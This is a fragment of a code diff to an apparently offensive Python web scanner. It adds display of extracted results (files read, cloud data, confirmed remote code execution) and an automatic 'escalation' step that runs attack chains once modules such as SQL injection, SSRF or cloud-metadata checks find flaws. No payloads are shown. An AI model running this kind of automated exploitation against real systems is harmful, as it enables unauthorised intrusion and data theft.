+                            extracted = f" -> {len(item['files_read'])} archivos leidos"
+                        elif "system_info" in item and item["system_info"]:
+                            extracted = f" -> {json.dumps(item['system_info'], default=str)[:80]}"
+                        elif "cloud_data" in item and item["cloud_data"]:
+                            extracted = f" -> {len(item['cloud_data'])} datos cloud"
+                        elif "rce_possible" in item and item["rce_possible"]:
+                            extracted = " -> RCE CONFIRMADO"
+                        elif "exploits" in item and item["exploits"]:
+                            extracted = f" -> {len(item['exploits'])} exploits"
+                        elif "admin_features" in item and item["admin_features"]:
+                            extracted = f" -> {len(item['admin_features'])} features admin"
+                        elif "attack_chains" in item and item["attack_chains"]:
+                            extracted = f" -> {len(item['attack_chains'])} cadenas de ataque"
+                        elif "bypasses" in item and item["bypasses"]:
+                            extracted = f" -> {len(item['bypasses'])} bypasses"
+                        color = C.R + C.BOLD if sev == "CRITICAL" else C.R if sev == "HIGH" else C.Y
+                        print(f"    {_c(color, f'[{sev}]')} {mod_name}{extracted}{cve_str}")
+
     print()
 
 
@@ -3116,7 +3882,7 @@ Modulos especificos:
     parser.add_argument("--ports", default="top100", help="top100 | rango (1-1000) | lista (80,443)")
     parser.add_argument("--wordlist", help="Wordlist custom para directorios")
     parser.add_argument("--sublist", help="Wordlist custom para subdominios")
-    parser.add_argument("--extensions", default="php,html,txt,bak,json,xml,asp,jsp")
+    parser.add_argument("--extensions", default="php,html,txt,bak,old,asp,aspx,jsp,json,xml,yml,yaml,conf,cfg,ini,log,sql,zip,tar.gz,rar")
     parser.add_argument("--crawl-depth", type=int, default=3)
     parser.add_argument("--crawl-pages", type=int, default=100)
     parser.add_argument("--user-agent", help="User-Agent custom")
@@ -3274,11 +4040,38 @@ Modulos especificos:
 
     start_time = time.time()
 
+    # Modulos que tienen escalacion automatica
+    escalation_modules = {"sqli","xss","lfi","ssti","cmdi","ssrf","xxe","jwt",
+                          "defcreds","redirect","rfi","crlf","hosthdr","hpp",
+                          "takeover","graphql","websocket","emailinj","cloudmeta"}
+    # Mapeo de key de modulo a key de results para escalacion
+    mod_result_key = {
+        "sqli": "sqli", "xss": "xss", "lfi": "lfi", "ssti": "ssti",
+        "cmdi": "cmdi", "ssrf": "ssrf", "xxe": "xxe", "jwt": "jwt",
+        "defcreds": "default_creds", "redirect": "open_redirect",
+        "rfi": "rfi", "crlf": "crlf", "hosthdr": "host_header",
+        "hpp": "hpp", "takeover": "subdomain_takeover",
+        "graphql": "graphql", "websocket": "websocket",
+        "emailinj": "email_injection", "cloudmeta": "cloud_metadata",
+    }
+
     # Execute modules
     for mod_key in valid_modules:
         name, func = ALL_MODULES[mod_key]
         try:
             func(ctx)
+
+            # Auto-escalation: si el modulo encontro vulns, profundizar
+            if mod_key in escalation_modules:
+                result_key = mod_result_key.get(mod_key, mod_key)
+                findings = ctx["results"].get(result_key, [])
+                if isinstance(findings, list) and findings:
+                    escalations = run_escalation(ctx, result_key, findings)
+                    if escalations:
+                        ctx["results"][f"{result_key}_escalation"] = escalations
+                        esc_count = len(escalations)
+                        log_ok(f"  Auto-escalation: {esc_count} cadenas ejecutadas para {name}")
+
         except KeyboardInterrupt:
             log_warn("Interrumpido por usuario. Generando reporte parcial...")
             break
